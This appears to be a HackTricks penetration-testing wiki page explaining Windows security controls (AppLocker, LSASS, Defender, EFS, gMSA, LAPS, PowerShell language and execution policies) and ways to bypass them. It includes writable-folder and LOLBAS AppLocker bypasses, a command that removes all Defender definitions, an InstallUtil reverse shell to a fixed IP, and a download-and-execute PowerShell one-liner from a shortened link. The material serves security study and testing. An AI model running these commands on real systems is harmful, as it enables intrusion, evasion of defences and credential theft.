# Windows Security Controls

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker Policy

An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system. The goal is to protect the environment from harmful malware and unapproved software that does not align with the specific business needs of an organization.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's **application whitelisting solution** and gives system administrators control over **which applications and files users can run**. It provides **granular control** over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers.\
It is common for organizations to **block cmd.exe and PowerShell.exe** and write access to certain directories, **but this can all be bypassed**.

### Check

Check which files/extensions are blacklisted/whitelisted:

```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

This registry path contains the configurations and policies applied by AppLocker, providing a way to review the current set of rules enforced on the system:

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

* Useful **Writable folders** to bypass AppLocker Policy: If AppLocker is allowing to execute anything inside `C:\Windows\System32` or `C:\Windows` there are **writable folders** you can use to **bypass this**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

* Commonly **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries can be also useful to bypass AppLocker.
* **Poorly written rules could also be bypassed**
  * For example, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, you can create a **folder called `allowed`** anywhere and it will be allowed.
  * Organizations also often focus on **blocking the `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable**, but forget about the **other** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`.
* **DLL enforcement very rarely enabled** due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break. So using **DLLs as backdoors will help bypassing AppLocker**.
* You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass AppLocker. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Credentials Storage

### Security Accounts Manager (SAM)

Local credentials are present in this file, the passwords are hashed.

### Local Security Authority (LSA) - LSASS

The **credentials** (hashed) are **saved** in the **memory** of this subsystem for Single Sign-On reasons.\
**LSA** administrates the local **security policy** (password policy, users permissions...), **authentication**, **access tokens**...\
LSA will be the one that will **check** for provided credentials inside the **SAM** file (for a local login) and **talk** with the **domain controller** to authenticate a domain user.

The **credentials** are **saved** inside the **process LSASS**: Kerberos tickets, hashes NT and LM, easily decrypted passwords.

### LSA secrets

LSA could save in disk some credentials:

* Password of the computer account of the Active Directory (unreachable domain controller).
* Passwords of the accounts of Windows services
* Passwords for scheduled tasks
* More (password of IIS applications...)

### NTDS.dit

It is the database of the Active Directory. It is only present in Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) is an Antivirus that is available in Windows 10 and Windows 11, and in versions of Windows Server. It **blocks** common pentesting tools such as **`WinPEAS`**. However, there are ways to **bypass these protections**.

### Check

To check the **status** of **Defender** you can execute the PS cmdlet **`Get-MpComputerStatus`** (check the value of **`RealTimeProtectionEnabled`** to know if it's active):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

To enumerate it you could also run:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Encrypted File System (EFS)

EFS secures files through encryption, utilizing a **symmetric key** known as the **File Encryption Key (FEK)**. This key is encrypted with the user's **public key** and stored within the encrypted file's $EFS **alternative data stream**. When decryption is needed, the corresponding **private key** of the user's digital certificate is used to decrypt the FEK from the $EFS stream. More details can be found [here](https://en.wikipedia.org/wiki/Encrypting\_File\_System).

**Decryption scenarios without user initiation** include:

* When files or folders are moved to a non-EFS file system, like [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table), they are automatically decrypted.
* Encrypted files sent over the network via SMB/CIFS protocol are decrypted prior to transmission.

This encryption method allows **transparent access** to encrypted files for the owner. However, simply changing the owner's password and logging in will not permit decryption.

**Key Takeaways**:

* EFS uses a symmetric FEK, encrypted with the user's public key.
* Decryption employs the user's private key to access the FEK.
* Automatic decryption occurs under specific conditions, like copying to FAT32 or network transmission.
* Encrypted files are accessible to the owner without additional steps.

### Check EFS info

Check if a **user** has **used** this **service** checking if this path exists:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Check **who** has **access** to the file using cipher /c \<file>\
You can also use `cipher /e` and `cipher /d` inside a folder to **encrypt** and **decrypt** all the files

### Decrypting EFS files

#### Being Authority System

This way requires the **victim user** to be **running** a **process** inside the host. If that is the case, using a `meterpreter` sessions you can impersonate the token of the process of the user (`impersonate_token` from `incognito`). Or you could just `migrate` to process of the user.

#### Knowing the users password

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Group Managed Service Accounts (gMSA)

Microsoft developed **Group Managed Service Accounts (gMSA)** to simplify the management of service accounts in IT infrastructures. Unlike traditional service accounts that often have the "**Password never expire**" setting enabled, gMSAs offer a more secure and manageable solution:

* **Automatic Password Management**: gMSAs use a complex, 240-character password that automatically changes according to domain or computer policy. This process is handled by Microsoft's Key Distribution Service (KDC), eliminating the need for manual password updates.
* **Enhanced Security**: These accounts are immune to lockouts and cannot be used for interactive logins, enhancing their security.
* **Multiple Host Support**: gMSAs can be shared across multiple hosts, making them ideal for services running on multiple servers.
* **Scheduled Task Capability**: Unlike managed service accounts, gMSAs support running scheduled tasks.
* **Simplified SPN Management**: The system automatically updates the Service Principal Name (SPN) when there are changes to the computer's sAMaccount details or DNS name, simplifying SPN management.

The passwords for gMSAs are stored in the LDAP property _**msDS-ManagedPassword**_ and are automatically reset every 30 days by Domain Controllers (DCs). This password, an encrypted data blob known as [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), can only be retrieved by authorized administrators and the servers on which the gMSAs are installed, ensuring a secure environment. To access this information, a secured connection such as LDAPS is required, or the connection must be authenticated with 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../.gitbook/assets/asd1.png)

You can read this password with [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**

```
/GMSAPasswordReader --AccountName jkohler
```

[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.

## LAPS

The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), enables the management of local Administrator passwords. These passwords, which are **randomized**, unique, and **regularly changed**, are stored centrally in Active Directory. Access to these passwords is restricted through ACLs to authorized users. With sufficient permissions granted, the ability to read local admin passwords is provided.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **locks down many of the features** needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more.

### **Check**

```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

```powershell
#Easy bypass
Powershell -version 2
```

In current Windows that Bypass won't work but you can use[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**To compile it you may need** **to** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> add `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` and **change the project to .Net4.5**.

#### Direct bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass the constrained mode. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS Execution Policy

By default it is set to **restricted.** Main ways to bypass this policy:

```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

Is the API that can be use to authenticate users.

The SSPI will be in charge of finding the adequate protocol for two machines that want to communicate. The preferred method for this is Kerberos. Then the SSPI will negotiate which authentication protocol will be used, these authentication protocols are called Security Support Provider (SSP), are located inside each Windows machine in the form of a DLL and both machines must support the same to be able to communicate.

### Main SSPs

* **Kerberos**: The preferred one
  * %windir%\Windows\System32\kerberos.dll
* **NTLMv1** and **NTLMv2**: Compatibility reasons
  * %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Web servers and LDAP, password in form of a MD5 hash
  * %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL and TLS
  * %windir%\Windows\System32\Schannel.dll
* **Negotiate**: It is used to negotiate the protocol to use (Kerberos or NTLM being Kerberos the default one)
  * %windir%\Windows\System32\lsasrv.dll

#### The negotiation could offer several methods or only one.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a **consent prompt for elevated activities**.

{% content-ref url="uac-user-account-control.md" %}
[uac-user-account-control.md](uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

